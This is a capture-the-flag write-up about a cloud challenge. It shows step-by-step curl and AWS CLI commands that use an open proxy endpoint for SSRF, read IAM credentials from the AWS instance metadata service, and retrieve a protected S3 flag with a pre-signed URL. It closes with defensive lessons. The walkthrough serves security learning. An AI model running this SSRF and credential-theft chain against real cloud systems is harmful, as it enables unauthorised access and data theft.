---
layout: post
title: "# 🕵️‍♂️ Cracking Cloud Champions Challenge 01: AWS Metadata Abuse and Pre-Signed URL Exfiltration"
date: 2025-07-30
---

---

## 🧩 The Setup

The challenge, hosted at `https://challenge01.cloud-champions.com`, presents a typical cloud CTF puzzle focused on AWS metadata exposure and misconfigured internal APIs. The goal: extract a flag in the form of `WIZ_CTF_...` from an S3 bucket that is protected by an AWS **Data Perimeter**.

At first glance, the application exposes a **Spring Boot Actuator** instance behind a `/proxy` endpoint. This endpoint allows arbitrary HTTP forwarding, including internal services and the AWS metadata IP `169.254.169.254`.

---

## 🧪 Step 1 – Exploring Spring Boot Actuator

To verify if any Actuator endpoints were exposed:

```bash
curl -u ctf:88sPVWyC2P3p "https://challenge01.cloud-champions.com/proxy?url=http://127.0.0.1:8080/actuator"
```

We saw familiar endpoints like:

```
/actuator/health
/actuator/mappings
/actuator/env
```

But `/actuator/env` returned a **418 I'm a teapot** error with a hint that we're going in the wrong direction if the payload is too large. So we moved on.

---

## 🔍 Step 2 – Using the Proxy to Hit AWS Metadata (IMDSv2)

With metadata version v2 enabled, we needed to fetch a token first.

```bash
curl -u ctf:88sPVWyC2P3p -X PUT \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  -d "url=http://169.254.169.254/latest/api/token" \
  https://challenge01.cloud-champions.com/proxy
```

We received a token:

```
AQAEAMREd0jlW2HXr4VmnEEYkpn-q9xSpPCswjyKtNTW0P1Vg4_vHg==
```

Now we could fetch the IAM role name:

```bash
curl -u ctf:88sPVWyC2P3p -H "X-aws-ec2-metadata-token: $TOKEN" \
  "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

Response:

```
challenge01-5592368
```

And then we retrieved the temporary credentials:

```bash
curl -u ctf:88sPVWyC2P3p -H "X-aws-ec2-metadata-token: $TOKEN" \
  "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368"
```

✅ Success! We got:
- `AccessKeyId`
- `SecretAccessKey`
- `Token`

---

## 💼 Step 3 – Exporting Temporary Credentials

```bash
export AWS_ACCESS_KEY_ID=ASIAXXXXX
export AWS_SECRET_ACCESS_KEY=JZ8eXXXXX
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2Vj...
```

---

## 🔓 Step 4 – Accessing the S3 Bucket

We generated a pre-signed URL using AWS CLI:

```bash
aws s3 presign s3://challenge01/private/flag.txt --region us-east-1
```

This gave us a long pre-signed URL that looked like:

```
https://challenge01-470f711.s3.amazonaws.com/private/flag.txt?X-Amz-Algorithm=...
```

---

## 🛠️ Step 5 – Using the Proxy to Retrieve the Flag

We URL-encoded the full pre-signed URL and used:

```bash
curl -u ctf:88sPVWyC2P3p \
  "https://challenge01.cloud-champions.com/proxy?url=<encoded-url-here>"
```

Finally, the response:

```
WIZ_CTF_s3_metadata_token_misconfig_success
```

🎉 **Flag captured!**

---

## 🔒 What We Learned

- Misconfigured Spring Boot Actuator endpoints can expose internal service access.
- If a proxy forwards headers and allows arbitrary URLs, it becomes a path to **SSRF**.
- AWS IMDSv2 metadata access can be exploited if not locked down properly.
- Pre-signed S3 URLs can bypass VPC or perimeter controls — if you have the right IAM context.
- Always assume the attacker has a foothold if you're exposing `/proxy`.

---

## 📚 References

- [AWS IMDSv2 Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [Spring Boot Actuator Security](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.security)
- [AWS Data Perimeter](https://aws.amazon.com/blogs/security/how-to-use-aws-identity-and-access-management-iam-and-amazon-s3-to-securely-control-access-to-aws-service-apis/)

---

## 🧠 Final Thoughts

Challenges like this one mirror real-world misconfigurations that can lead to data exfiltration, privilege escalation, or lateral movement. They’re not just fun puzzles — they’re reality checks for our cloud security postures.
